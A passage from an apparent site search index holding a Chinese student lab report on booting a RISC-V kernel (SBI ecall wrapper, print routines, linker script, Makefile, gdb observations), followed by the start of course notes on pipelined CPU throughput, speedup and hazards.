)( fid ); register uint64 a7 asm ( \"a7\" ) = ( uint64 )( ext ); asm volatile ( \"ecall\" : \"+r\" ( a0 ), \"+r\" ( a1 ) : \"r\" ( a2 ), \"r\" ( a3 ), \"r\" ( a4 ), \"r\" ( a5 ), \"r\" ( a6 ), \"r\" ( a7 ) : \"memory\" ); ret . error = a0 ; ret . value = a1 ; return ret ; } \u5bf9\u4e8e\u5b83\u7684\u4f7f\u7528\u53ef\u4ee5\u5148\u5b9e\u73b0\u4e09\u4e2a\uff08sbi.h \u4e2d\u8fd8\u9700\u8981\u6dfb\u52a0\u4e00\u4e0b\u51fd\u6570\u58f0\u660e\uff09\uff1a - sbi_set_timer\uff1aext \u4e3a 0x00\uff0c\u6709\u4e00\u4e2a\u8f93\u5165 stime_value - sbi_console_putchar\uff1aext \u4e3a 0x01\uff0c\u6709\u4e00\u4e2a\u8f93\u5165 ch \u8868\u793a\u8981\u8f93\u51fa\u7684\u5b57\u7b26 ASCII \u7801 - sbi_console_getchar\uff1aext \u4e3a 0x02\uff0c\u65e0\u8f93\u5165\uff0ca0\uff08\u5373 ret.error\uff09\u4e3a\u8f93\u5165\u5b57\u7b26\u7684 ASCII \u7801 void sbi_set_timer ( uint64 stime_value ) { sbi_ecall ( 0x00 , 0 , stime_value , 0 , 0 , 0 , 0 , 0 ); } void sbi_console_putchar ( int ch ) { sbi_ecall ( 0x01 , 0 , ch , 0 , 0 , 0 , 0 , 0 ); } int sbi_console_getchar () { struct sbiret ret ; ret = sbi_ecall ( 0x02 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ); return ret . error ; } print.c & Makefile \u00b6 print.c \u4e2d\u9700\u8981\u5b9a\u4e49\u4e24\u4e2a\u4f7f\u7528 sbi_ecall (sbi_console_putchar) \u6765\u5b9e\u73b0\u8f93\u51fa\u7684\u4e24\u4e2a\u51fd\u6570 puts \u548c puti\u3002\u5176\u4e2d puts \u76f4\u63a5\u9010\u5b57\u7b26\u8c03\u7528 sbi_console_putchar \u8f93\u51fa\u76f4\u5230\u9047\u5230 '\\0'\uff1a void puts ( char * s ) { while ( * s ) { sbi_console_putchar ( * s ++ ); } } puti \u5148\u679a\u4e3e 0\u3001\u8d1f\u6570\u7b49\u7279\u6b8a\u60c5\u51b5\uff0c\u7136\u540e\u5229\u7528\u53d6\u6a21\u8fd0\u7b97\u6765\u5c06\u6570\u5b57\u9010\u4f4d\u8f6c\u4e3a\u5b57\u7b26\uff0c\u518d\u9010\u5b57\u7b26\u8f93\u51fa\uff1a void puti ( int x ) { char buf [ 16 ]; int i = 0 ; if ( x == 0 ) { sbi_console_putchar ( '0' ); return ; } if ( x < 0 ) { sbi_console_putchar ( '-' ); x = - x ; } while ( x ) { buf [ i ++ ] = '0' + x % 10 ; x /= 10 ; } while ( i ) { sbi_console_putchar ( buf [ -- i ]); } } Makefile \u548c\u5176\u5b83 Makefile \u4e00\u6837\u5c31\u53ef\u4ee5\uff0c\u5373\u5c06\u76ee\u5f55\u4e0b\u6240\u6709 .c \u6587\u4ef6\u7f16\u8bd1\u51fa .o \u6587\u4ef6\uff1a C_SRC = $( sort $( wildcard *.c )) OBJ = $( patsubst %.c,%.o, $( C_SRC )) file = main.o all : $( OBJ ) %.o : %. c ${ GCC } ${ CFLAG } -c $< clean : $( shell rm *.o 2 >/dev/null ) defs.h \u00b6 defs.h \u4e2d\u9700\u8981\u8865\u5168 csr_read \u5b8f\u3002\u76f4\u63a5\u4f7f\u7528\u5185\u8054\u6c47\u7f16\u8c03\u7528 csrr \u6307\u4ee4\u5c06 csr \u5bc4\u5b58\u5668\u7684\u503c\u8bfb\u5165 __v \u53d8\u91cf\u5373\u53ef\uff1a #define csr_read(csr) \\ ({ \\ register uint64 __v; \\ asm volatile (\"csrr %0, \" #csr \\ : \"=r\" (__v) : \\ : \"memory\"); \\ __v; \\ }) \u8fd0\u884c\u7ed3\u679c \u00b6 \u8fd0\u884c make \u53ef\u4ee5\u6b63\u5e38\u7f16\u8bd1\u5e76\u4ea7\u751f\u7f16\u8bd1\u4ea7\u7269\uff1a \u8fd0\u884c make run \u53ef\u4ee5\u6b63\u5e38\u542f\u52a8\u5185\u6838\u5e76\u8f93\u51fa\u4fe1\u606f \u201c2022 ZJU Computer System II\u201d\uff1a \u601d\u8003\u9898 \u00b6 \u89c2\u5bdf System.map \u4e2d\u7684\u5730\u5740\u662f\u5426\u7b26\u5408\u9884\u671f \u00b6 \u67e5\u770b System.map \u5e76\u5c06\u5176\u6709\u6548\u90e8\u5206\u6309\u7167\u5730\u5740\u6392\u5e8f\u8f93\u51fa\uff1a \u7ecf\u89c2\u5bdf\u3001_start \u7684\u5730\u5740\u4e3a 0x80200000\u3001\u540c\u6837 _stext \u5373 .text \u6bb5\u7684\u8d77\u59cb\u5730\u5740\u4e5f\u4e3a 0x80200000\u3002\u63a5\u7740\u662f\u4e00\u4e9b sbi.c \u4e2d\u5b9e\u73b0\u7684\u51fd\u6570\uff0c\u7136\u540e\u662f start_kernel \u51fd\u6570\u4e0e\u5176\u540e\u7684\u4e00\u4e9b\u51fd\u6570\uff0c\u7136\u540e .text \u6bb5\u7ed3\u675f\uff08_etext\uff09\u3002\u540e\u9762\u662f .rodata \u6bb5\uff0c\u5176\u4fdd\u5b58\u4e86\u5b57\u7b26\u4e32 \" ZJU Computer System II\"\u3002\u7136\u540e\u662f\u7a7a\u7684 .data \u6bb5\u548c .bss \u6bb5\uff08\u8fd9\u91cc\u6ca1\u6709\u7528\u5230\uff09\uff0c\u63a5\u7740 _end \u5373\u5185\u6838\u7ed3\u675f\u5730\u5740\u3002\u7136\u540e\u662f\u6808\u7a7a\u95f4\uff08\u8d77\u59cb sp \u4f4d\u4e8e boot_stack_top\uff0c\u6808\u7a7a\u95f4\u5411\u5c0f\u5730\u5740\u589e\u957f\uff09\u3002\u53ef\u89c1\u5747\u7b26\u5408\u9884\u671f\u3002 \u8c03\u8bd5\u89c2\u5bdf\u7a0b\u5e8f\u5f00\u59cb\u65f6\u7684\u7279\u6743\u6001\u548c\u4e2d\u65ad\u4fe1\u606f \u00b6 gdb \u5728\u5f00\u5934\u4e0b\u65ad\u70b9\u3001\u8fd0\u884c\u5230\u7a0b\u5e8f\u5f00\u5934\u5904\uff0c\u68c0\u67e5\u7279\u6743\u6001\uff08priv \u5bc4\u5b58\u5668\uff0c\u503c\u4e3a 1 \u5373 Supervisor\uff09\u548c\u5b58\u6709\u4e2d\u65ad\u4fe1\u606f\u7684\u5bc4\u5b58\u5668\uff1a \u8c03\u8bd5\u89c2\u5bdf\u7a0b\u5e8f\u5f00\u59cb\u65f6\u5404\u6bb5\u5185\u5bb9 \u00b6 \u8fde\u63a5 gdb\u3001\u4e0b\u65ad\u70b9\u3001\u5f00\u59cb\u8fd0\u884c\u3001\u68c0\u67e5\u5404\u6bb5\u5185\u5bb9\uff1a \u53ef\u4ee5\u770b\u89c1 .text \u6bb5\u5b58\u4e86\u6307\u4ee4\u3002.rodata \u6bb5\u5b58\u4e86\u5b57\u7b26\u4e32 \" ZJU Computer System II\\n\"\u3002.data \u6bb5\u770b\u8d77\u6765\u4e0d\u4e3a\u7a7a\uff0c\u4f46\u5b9e\u9645\u4e0a .data \u6bb5\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\u5e76\u4e0d\u5b58\u5728\uff0c\u8fd9\u90e8\u5206\u6570\u636e\u4e3a _GLOBAL_OFFSET_TABLE_ \u5185\u5bb9\u3002.bss \u6bb5\u4e3a\u7a7a\uff08\u5b9e\u9645\u4e5f\u4e0d\u5b58\u5728\uff09\u3001\u6808\u7a7a\u95f4\u5185\u5bb9\u4e3a\u7a7a\u3002 \u5c1d\u8bd5\u4ece\u6c47\u7f16\u4ee3\u7801\u4e2d\u7ed9 C \u51fd\u6570 start_kernel \u4f20\u9012\u53c2\u6570 \u00b6 RISC-V \u8c03\u7528\u51fd\u6570\u4f1a\u4f7f\u7528 a0-a7 \u5bc4\u5b58\u5668\u4f20\u9012\u53c2\u6570\uff0c\u6240\u4ee5\u5728 head.S \u4e2d\u8bbe\u7f6e\u5bc4\u5b58\u5668\u7684\u503c\u5c31\u53ef\u4ee5\u5b8c\u6210\u603c start_kernel \u51fd\u6570\u7684\u4f20\u53c2\u3002\u9996\u5148\u4fee\u6539 init/main.c \u6765\u4e3a start_kernel \u6dfb\u52a0\u53c2\u6570\uff1a int start_kernel ( int x ) { puti ( x ); puts ( \" ZJU Computer System II \\n \" ); ... } \u7136\u540e\u5728 head.S \u4e2d\u76f4\u63a5\u4e3a a0 \u5bc4\u5b58\u5668\u8d4b\u503c\u5b8c\u6210\u4f20\u53c2\uff1a _start: la sp, boot_stack_top li a0, 2022 j start_kernel \u8fd0\u884c make run \u53ef\u4ee5\u6b63\u5e38\u542f\u52a8\u5185\u6838\u5e76\u8f93\u51fa\u4fe1\u606f \u201c2022 ZJU Computer System II\u201d\uff1a","title":"\u7cfb\u7edf II lab4"},{"location":"cs/system/cs2/lab4/#rv64","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 lab4 \u5b9e\u9a8c\u62a5\u544a\uff082022.11.03 ~ 2022.11.17\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad","title":"RV64 \u5185\u6838\u5f15\u5bfc"},{"location":"cs/system/cs2/lab4/#_1","text":"\u7f16\u5199\u3001\u5b8c\u6210\u6240\u7ed9\u5b9e\u9a8c\u4ee3\u7801\u6846\u67b6\uff0c\u5e76\u6210\u529f\u8fd0\u884c arch/riscv/kernel/head.S lib/Makefile arch/riscv/kernel/sbi.c lib/print.c arch/riscv/include/defs.h \u601d\u8003\u9898 \u7f16\u8bd1\u4e4b\u540e\uff0c\u901a\u8fc7 System.map \u67e5\u770b vmlinux.lds \u4e2d\u81ea\u5b9a\u4e49\u7b26\u53f7\u7684\u503c\uff0c\u6bd4\u8f83\u4ed6\u4eec\u7684\u5730\u5740\u662f\u5426\u7b26\u5408\u4f60\u7684\u9884\u671f \u5728\u4f60\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u5904\u6dfb\u52a0\u65ad\u70b9\uff0c\u89c2\u5bdf\u4f60\u7684\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u65f6\u7684\u7279\u6743\u6001\u662f\u591a\u5c11\uff0c\u4e2d\u65ad\u7684\u5f00\u542f\u60c5\u51b5\u662f\u600e\u4e48\u6837\u7684 \u5728\u4f60\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u5904\u6dfb\u52a0\u65ad\u70b9\uff0c\u89c2\u5bdf\u5185\u5b58\u4e2d text\u3001data\u3001bss \u6bb5\u7684\u5185\u5bb9\u662f\u600e\u6837\u7684 \u5c1d\u8bd5\u4ece\u6c47\u7f16\u4ee3\u7801\u4e2d\u7ed9 C \u51fd\u6570 start_kernel \u4f20\u9012\u53c2\u6570","title":"\u5b9e\u9a8c\u5185\u5bb9"},{"location":"cs/system/cs2/lab4/#_2","text":"","title":"\u4ee3\u7801\u7f16\u5199"},{"location":"cs/system/cs2/lab4/#heads-vmlinuxlds","text":"head.S \u7684\u4f5c\u7528\u662f\u4f5c\u4e3a\u6574\u4e2a\u5185\u6838\u542f\u52a8\u7684\u5f15\u5bfc\u3002\u5176\u8981\u5b8c\u6210\u7684\u662f 1. \u4e3a start_kernel \u8bbe\u7f6e\u4e00\u4e2a\u6808\u7a7a\u95f4\uff08\u5373\u521b\u5efa\u6808\u7a7a\u95f4\u5e76\u5c06 sp \u6307\u5230\u6808\u9876\uff092. \u8df3\u8f6c\u5230 start_kernel \u5185\u3002 vmlinux.lds \u7684\u4f5c\u7528\u662f\u5b9a\u4e49\u5185\u6838\u7684\u5185\u5b58\u5e03\u5c40\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u5c06\u6808\u7a7a\u95f4\u653e\u5230 _end \u540e\u9762\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728 vmlinux.lds \u4e2d _end \u540e\u9762\u518d\u52a0\u4e00\u4e2a\u6bb5 .stack\uff0c\u65b9\u4fbf\u540e\u7eed head.S \u5728\u6b64\u5904\u63d2\u5165\u6808\u7a7a\u95f4\uff1a _end = .; .stack : ALIGN(0x1000){ _sstack = .; *(.stack.entry) _estack = .; } } \u7136\u540e\u5728 head.S \u4e2d\u5229\u7528 .space \u8bbe\u7f6e\u7a7a\u95f4\u5927\u5c0f\u4e3a 4KB\u3001la \u6765\u8bbe\u7f6e sp \u5bc4\u5b58\u5668\u3001j \u6307\u4ee4\u8df3\u8f6c\u5230 start_kernel \u4e2d\uff1a .extern start_kernel .section .text.entry .globl _start _start: la sp, boot_stack_top j start_kernel .section .stack.entry .globl boot_stack_bottom boot_stack_bottom: .space 4096 .globl boot_stack_top boot_stack_top:","title":"head.S &amp; vmlinux.lds"},{"location":"cs/system/cs2/lab4/#sbic","text":"sbi.c \u7684\u4f5c\u7528\u662f\u5b9e\u73b0 SBI \u8c03\u7528\u3002\u6700\u4e3b\u8981\u7684\u76ee\u7684\u662f\u5b9e\u73b0 sbi_ecall \u6765\u6267\u884c\u73af\u5883\u8c03\u7528\uff0c\u7528\u5176\u53ef\u4ee5\u5b9e\u73b0 sbi_console_putchar \u7b49\u51fd\u6570\u3002 sbi_ecall \u7684\u5b9e\u73b0\u53c2\u8003\u4e86 Linux 6.0.7 \u7684\u4ee3\u7801\u5b9e\u73b0\u3002\u5176\u4e3b\u8981\u8fc7\u7a0b\u5c31\u662f\u5c06\u51fd\u6570\u53c2\u6570\u5e03\u5c40\u5230\u5bc4\u5b58\u5668\u4e2d\uff08ext \u653e\u5230 a7\u3001fid \u653e\u5230 a6\u3001arg0-5 \u653e\u5230 a0-5\uff09\uff0c\u7136\u540e\u6267\u884c ecall \u6307\u4ee4\uff0c\u6700\u540e\u8fd4\u56de\u7684\u7ed3\u679c\u6709 a0 \u8868\u793a error code\uff0ca1 \u8868\u793a\u8fd4\u56de\u503c\uff08\u6240\u4ee5\u8fd9\u4e24\u4e2a\u5bc4\u5b58\u5668\u8981\u662f\u8bfb\u5199\u7684\uff0c\u5176\u5b83\u662f\u53ef\u8bfb\u5373\u53ef\uff09\uff0c\u5e76\u4e14\u53ef\u80fd\u4f1a\u4fee\u6539\u5185\u5b58\u3002\u5229\u7528\u5185\u8054\u6c47\u7f16\u53ef\u4ee5\u8fdb\u884c\u5982\u4e0b\u5b9e\u73b0\uff1a struct sbiret sbi_ecall ( int ext , int fid , uint64 arg0 , uint64 arg1 , uint64 arg2 , uint64 arg3 , uint64 arg4 , uint64 arg5 ) { struct sbiret ret ; register uint64 a0 asm ( \"a0\" ) = ( uint64 )( arg0 ); register uint64 a1 asm ( \"a1\" ) = ( uint64 )( arg1 ); register uint64 a2 asm ( \"a2\" ) = ( uint64 )( arg2 ); register uint64 a3 asm ( \"a3\" ) = ( uint64 )( arg3 ); register uint64 a4 asm ( \"a4\" ) = ( uint64 )( arg4 ); register uint64 a5 asm ( \"a5\" ) = ( uint64 )( arg5 ); register uint64 a6 asm ( \"a6\" ) = ( uint64 )( fid ); register uint64 a7 asm ( \"a7\" ) = ( uint64 )( ext ); asm volatile ( \"ecall\" : \"+r\" ( a0 ), \"+r\" ( a1 ) : \"r\" ( a2 ), \"r\" ( a3 ), \"r\" ( a4 ), \"r\" ( a5 ), \"r\" ( a6 ), \"r\" ( a7 ) : \"memory\" ); ret . error = a0 ; ret . value = a1 ; return ret ; } \u5bf9\u4e8e\u5b83\u7684\u4f7f\u7528\u53ef\u4ee5\u5148\u5b9e\u73b0\u4e09\u4e2a\uff08sbi.h \u4e2d\u8fd8\u9700\u8981\u6dfb\u52a0\u4e00\u4e0b\u51fd\u6570\u58f0\u660e\uff09\uff1a - sbi_set_timer\uff1aext \u4e3a 0x00\uff0c\u6709\u4e00\u4e2a\u8f93\u5165 stime_value - sbi_console_putchar\uff1aext \u4e3a 0x01\uff0c\u6709\u4e00\u4e2a\u8f93\u5165 ch \u8868\u793a\u8981\u8f93\u51fa\u7684\u5b57\u7b26 ASCII \u7801 - sbi_console_getchar\uff1aext \u4e3a 0x02\uff0c\u65e0\u8f93\u5165\uff0ca0\uff08\u5373 ret.error\uff09\u4e3a\u8f93\u5165\u5b57\u7b26\u7684 ASCII \u7801 void sbi_set_timer ( uint64 stime_value ) { sbi_ecall ( 0x00 , 0 , stime_value , 0 , 0 , 0 , 0 , 0 ); } void sbi_console_putchar ( int ch ) { sbi_ecall ( 0x01 , 0 , ch , 0 , 0 , 0 , 0 , 0 ); } int sbi_console_getchar () { struct sbiret ret ; ret = sbi_ecall ( 0x02 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ); return ret . error ; }","title":"sbi.c"},{"location":"cs/system/cs2/lab4/#printc-makefile","text":"print.c \u4e2d\u9700\u8981\u5b9a\u4e49\u4e24\u4e2a\u4f7f\u7528 sbi_ecall (sbi_console_putchar) \u6765\u5b9e\u73b0\u8f93\u51fa\u7684\u4e24\u4e2a\u51fd\u6570 puts \u548c puti\u3002\u5176\u4e2d puts \u76f4\u63a5\u9010\u5b57\u7b26\u8c03\u7528 sbi_console_putchar \u8f93\u51fa\u76f4\u5230\u9047\u5230 '\\0'\uff1a void puts ( char * s ) { while ( * s ) { sbi_console_putchar ( * s ++ ); } } puti \u5148\u679a\u4e3e 0\u3001\u8d1f\u6570\u7b49\u7279\u6b8a\u60c5\u51b5\uff0c\u7136\u540e\u5229\u7528\u53d6\u6a21\u8fd0\u7b97\u6765\u5c06\u6570\u5b57\u9010\u4f4d\u8f6c\u4e3a\u5b57\u7b26\uff0c\u518d\u9010\u5b57\u7b26\u8f93\u51fa\uff1a void puti ( int x ) { char buf [ 16 ]; int i = 0 ; if ( x == 0 ) { sbi_console_putchar ( '0' ); return ; } if ( x < 0 ) { sbi_console_putchar ( '-' ); x = - x ; } while ( x ) { buf [ i ++ ] = '0' + x % 10 ; x /= 10 ; } while ( i ) { sbi_console_putchar ( buf [ -- i ]); } } Makefile \u548c\u5176\u5b83 Makefile \u4e00\u6837\u5c31\u53ef\u4ee5\uff0c\u5373\u5c06\u76ee\u5f55\u4e0b\u6240\u6709 .c \u6587\u4ef6\u7f16\u8bd1\u51fa .o \u6587\u4ef6\uff1a C_SRC = $( sort $( wildcard *.c )) OBJ = $( patsubst %.c,%.o, $( C_SRC )) file = main.o all : $( OBJ ) %.o : %. c ${ GCC } ${ CFLAG } -c $< clean : $( shell rm *.o 2 >/dev/null )","title":"print.c &amp; Makefile"},{"location":"cs/system/cs2/lab4/#defsh","text":"defs.h \u4e2d\u9700\u8981\u8865\u5168 csr_read \u5b8f\u3002\u76f4\u63a5\u4f7f\u7528\u5185\u8054\u6c47\u7f16\u8c03\u7528 csrr \u6307\u4ee4\u5c06 csr \u5bc4\u5b58\u5668\u7684\u503c\u8bfb\u5165 __v \u53d8\u91cf\u5373\u53ef\uff1a #define csr_read(csr) \\ ({ \\ register uint64 __v; \\ asm volatile (\"csrr %0, \" #csr \\ : \"=r\" (__v) : \\ : \"memory\"); \\ __v; \\ })","title":"defs.h"},{"location":"cs/system/cs2/lab4/#_3","text":"\u8fd0\u884c make \u53ef\u4ee5\u6b63\u5e38\u7f16\u8bd1\u5e76\u4ea7\u751f\u7f16\u8bd1\u4ea7\u7269\uff1a \u8fd0\u884c make run \u53ef\u4ee5\u6b63\u5e38\u542f\u52a8\u5185\u6838\u5e76\u8f93\u51fa\u4fe1\u606f \u201c2022 ZJU Computer System II\u201d\uff1a","title":"\u8fd0\u884c\u7ed3\u679c"},{"location":"cs/system/cs2/lab4/#_4","text":"","title":"\u601d\u8003\u9898"},{"location":"cs/system/cs2/lab4/#systemmap","text":"\u67e5\u770b System.map \u5e76\u5c06\u5176\u6709\u6548\u90e8\u5206\u6309\u7167\u5730\u5740\u6392\u5e8f\u8f93\u51fa\uff1a \u7ecf\u89c2\u5bdf\u3001_start \u7684\u5730\u5740\u4e3a 0x80200000\u3001\u540c\u6837 _stext \u5373 .text \u6bb5\u7684\u8d77\u59cb\u5730\u5740\u4e5f\u4e3a 0x80200000\u3002\u63a5\u7740\u662f\u4e00\u4e9b sbi.c \u4e2d\u5b9e\u73b0\u7684\u51fd\u6570\uff0c\u7136\u540e\u662f start_kernel \u51fd\u6570\u4e0e\u5176\u540e\u7684\u4e00\u4e9b\u51fd\u6570\uff0c\u7136\u540e .text \u6bb5\u7ed3\u675f\uff08_etext\uff09\u3002\u540e\u9762\u662f .rodata \u6bb5\uff0c\u5176\u4fdd\u5b58\u4e86\u5b57\u7b26\u4e32 \" ZJU Computer System II\"\u3002\u7136\u540e\u662f\u7a7a\u7684 .data \u6bb5\u548c .bss \u6bb5\uff08\u8fd9\u91cc\u6ca1\u6709\u7528\u5230\uff09\uff0c\u63a5\u7740 _end \u5373\u5185\u6838\u7ed3\u675f\u5730\u5740\u3002\u7136\u540e\u662f\u6808\u7a7a\u95f4\uff08\u8d77\u59cb sp \u4f4d\u4e8e boot_stack_top\uff0c\u6808\u7a7a\u95f4\u5411\u5c0f\u5730\u5740\u589e\u957f\uff09\u3002\u53ef\u89c1\u5747\u7b26\u5408\u9884\u671f\u3002","title":"\u89c2\u5bdf System.map \u4e2d\u7684\u5730\u5740\u662f\u5426\u7b26\u5408\u9884\u671f"},{"location":"cs/system/cs2/lab4/#_5","text":"gdb \u5728\u5f00\u5934\u4e0b\u65ad\u70b9\u3001\u8fd0\u884c\u5230\u7a0b\u5e8f\u5f00\u5934\u5904\uff0c\u68c0\u67e5\u7279\u6743\u6001\uff08priv \u5bc4\u5b58\u5668\uff0c\u503c\u4e3a 1 \u5373 Supervisor\uff09\u548c\u5b58\u6709\u4e2d\u65ad\u4fe1\u606f\u7684\u5bc4\u5b58\u5668\uff1a","title":"\u8c03\u8bd5\u89c2\u5bdf\u7a0b\u5e8f\u5f00\u59cb\u65f6\u7684\u7279\u6743\u6001\u548c\u4e2d\u65ad\u4fe1\u606f"},{"location":"cs/system/cs2/lab4/#_6","text":"\u8fde\u63a5 gdb\u3001\u4e0b\u65ad\u70b9\u3001\u5f00\u59cb\u8fd0\u884c\u3001\u68c0\u67e5\u5404\u6bb5\u5185\u5bb9\uff1a \u53ef\u4ee5\u770b\u89c1 .text \u6bb5\u5b58\u4e86\u6307\u4ee4\u3002.rodata \u6bb5\u5b58\u4e86\u5b57\u7b26\u4e32 \" ZJU Computer System II\\n\"\u3002.data \u6bb5\u770b\u8d77\u6765\u4e0d\u4e3a\u7a7a\uff0c\u4f46\u5b9e\u9645\u4e0a .data \u6bb5\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\u5e76\u4e0d\u5b58\u5728\uff0c\u8fd9\u90e8\u5206\u6570\u636e\u4e3a _GLOBAL_OFFSET_TABLE_ \u5185\u5bb9\u3002.bss \u6bb5\u4e3a\u7a7a\uff08\u5b9e\u9645\u4e5f\u4e0d\u5b58\u5728\uff09\u3001\u6808\u7a7a\u95f4\u5185\u5bb9\u4e3a\u7a7a\u3002","title":"\u8c03\u8bd5\u89c2\u5bdf\u7a0b\u5e8f\u5f00\u59cb\u65f6\u5404\u6bb5\u5185\u5bb9"},{"location":"cs/system/cs2/lab4/#c-start_kernel","text":"RISC-V \u8c03\u7528\u51fd\u6570\u4f1a\u4f7f\u7528 a0-a7 \u5bc4\u5b58\u5668\u4f20\u9012\u53c2\u6570\uff0c\u6240\u4ee5\u5728 head.S \u4e2d\u8bbe\u7f6e\u5bc4\u5b58\u5668\u7684\u503c\u5c31\u53ef\u4ee5\u5b8c\u6210\u603c start_kernel \u51fd\u6570\u7684\u4f20\u53c2\u3002\u9996\u5148\u4fee\u6539 init/main.c \u6765\u4e3a start_kernel \u6dfb\u52a0\u53c2\u6570\uff1a int start_kernel ( int x ) { puti ( x ); puts ( \" ZJU Computer System II \\n \" ); ... } \u7136\u540e\u5728 head.S \u4e2d\u76f4\u63a5\u4e3a a0 \u5bc4\u5b58\u5668\u8d4b\u503c\u5b8c\u6210\u4f20\u53c2\uff1a _start: la sp, boot_stack_top li a0, 2022 j start_kernel \u8fd0\u884c make run \u53ef\u4ee5\u6b63\u5e38\u542f\u52a8\u5185\u6838\u5e76\u8f93\u51fa\u4fe1\u606f \u201c2022 ZJU Computer System II\u201d\uff1a","title":"\u5c1d\u8bd5\u4ece\u6c47\u7f16\u4ee3\u7801\u4e2d\u7ed9 C \u51fd\u6570 start_kernel \u4f20\u9012\u53c2\u6570"},{"location":"cs/system/cs2/topic1/","text":"\u6d41\u6c34\u7ebf CPU \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u7b2c 2 \u81f3 5 \u5468\u8bfe\u7a0b\u5185\u5bb9 \u6548\u7387\u4f30\u6d4b \u00b6 \u5355\u5468\u671f CPU \u7684\u65f6\u949f\u5468\u671f\u4e3a\u6700\u957f\u7684\u6307\u4ee4\u8fd0\u884c\u65f6\u95f4 \u6d41\u6c34\u7ebf CPU \u7684\u65f6\u949f\u5468\u671f\u4e3a\u6700\u957f\u7684\u64cd\u4f5c\u65f6\u95f4 \u8ba1\u7b97\u6307\u6807 \u00b6 \u541e\u5410\u91cf \u00b6 \u541e\u5410\u91cf\uff08TP\uff0cThroughput\uff09\uff1a \\(TP = \\dfrac{n}{T}\\) \uff08 \\(n\\) \u8868\u793a\u6307\u4ee4\u6761\u6570\uff0c \\(T\\) \u8868\u793a\u8fd0\u884c\u603b\u65f6\u957f\uff09 \u4e0a\u56fe\u4e2d\u540c\u4e00\u6570\u5b57\u4e3a\u540c\u4e00\u6761\u6307\u4ee4\uff0c\u7eb5\u5750\u6807\u4e3a\u4e0d\u540c\u9636\u6bb5\u7684\u64cd\u4f5c \u8bb0\u6bcf\u6761\u6307\u4ee4\u7684\u9636\u6bb5\u6570\u4e3a \\(m\\) \uff08\u9636\u6570\uff09\u3001\u6bcf\u4e2a\u9636\u6bb5\u7684\u8fd0\u884c\u65f6\u95f4\u4e3a \\(\\Delta t_0\\) \uff0c\u5219 \\(T = (m+n-1)\\Delta t_0\\) \uff0c \\(TP = \\dfrac{n}{m+n-1}\\cdot\\dfrac{1}{\\Delta t_0}\\) \u6700\u5927\u541e\u5410\u91cf\uff1a\u5f53 \\(n\\gg m\\) \u65f6\uff0c \\(TP\\) \u8fbe\u5230\u6700\u5927\uff0c\u5373 \\(TP_{\\rm max}=\\dfrac{1}{\\Delta t_0}\\) \u5b9e\u9645\u60c5\u51b5\u4e0b\u5404\u9636\u6bb5\u7684\u8fd0\u884c\u65f6\u95f4\u4e0d\u540c\uff0c\u6700\u957f\u7684\u79f0\u4e3a\u74f6\u9888\u9636\u6bb5\uff08bottleneck segment\uff09 \u8fd9\u79cd\u60c5\u51b5\u4e0b \\(TP\\) \u7684\u8ba1\u7b97\u65b9\u5f0f\u4e0d\u53d8\uff0c \\(TP_{\\rm max}=\\dfrac{1}{\\max(\\Delta t_1, \\Delta t_2, \\cdots, \\Delta t_m)}\\) \u89e3\u51b3\u6d41\u6c34\u7ebf\u74f6\u9888\u7684\u65b9\u6cd5\uff1a \u5c06\u74f6\u9888\u9636\u6bb5\u7ec6\u5206\u4e3a\u53ef\u4ee5\u6d41\u6c34\u7ebf\u64cd\u4f5c\u7684\u66f4\u5c0f\u9636\u6bb5\uff08Subdivision\uff09 \u91cd\u53e0\u6267\u884c\u4e0d\u540c\u6307\u4ee4\u7684\u74f6\u9888\u9636\u6bb5\uff08Repetition\uff09 \u52a0\u901f\u6bd4 \u00b6 \u52a0\u901f\u6bd4\uff08Sp\uff0cSpeedup\uff09\uff1a \\(Sp = \\dfrac{\\text{Execution Time}_\\text{non-pipelined}}{\\text{Execution Time}_\\text{pipelined}}\\) \u540c\u4e0a\u56fe\uff0c\u53ef\u4ee5\u8ba1\u7b97\u5f97\u5230 \\(Sp = \\dfrac{n\\cdot m\\cdot\\Delta t_0}{(m+n-1)\\Delta t_0} = \\dfrac{nm}{m+n-1}\\) \u5f53 \\(n\\gg m\\) \u65f6\uff0c \\(Sp=m\\) \u6548\u7387 \u00b6 \u6548\u7387\uff08 \\(\\eta\\) \uff09\uff1a \\(\\eta = \\dfrac{Sp}{m}\\) \u5f53 \\(n\\gg m\\) \u65f6\uff0c \\(\\eta=1\\) \u6d41\u6c34\u7ebf\u5192\u9669 \u00b6 \u6709\u4e09\u79cd\u7c7b\u578b\u7684\u6d41\u6c34\u7ebf\u5192\u9669\uff1a \u7ed3\u6784\u5192\u9669\uff08Structural Hazard\uff09\uff1a\u7531\u4e8e\u6d41\u6c34\u7ebf\u786c\u4ef6\u7ed3\u6784\u7684\u9650\u5236\uff0c\u5bfc\u81f4\u6d41\u6c34\u7ebf\u4e0d\u80fd\u6b63\u5e38\u5de5\u4f5c \u6570\u636e\u5192\u9669\uff08Data Hazard\uff09\uff1a\u7531\u4e8e\u6d41\u6c34\u7ebf\u4e2d\u7684\u6307\u4ee4\u9700\u8981\u8bbf\u95ee\u540c\u4e00\u6570\u636e\uff0c\u5bfc\u81f4\u6d41\u6c34\u7ebf\u4e0d\u80fd\u6b63\u5e38\u5de5\u4f5c \u63a7\u5236\u5192\u9669\uff08Control Hazard\uff09\uff1a\u7531\u4e8e\u6d41\u6c34\u7ebf\u4e2d\u7684\u6307\u4ee4\u9700\u8981\u8bbf\u95ee\u540c\u4e00\u63a7\u5236\u4fe1\u53f7\uff0c\u5bfc\u81f4\u6d41\u6c34\u7ebf\u4e0d\u80fd\u6b63\u5e38\u5de5\u4f5c \u7ed3\u6784\u5192\u9669 \u00b6 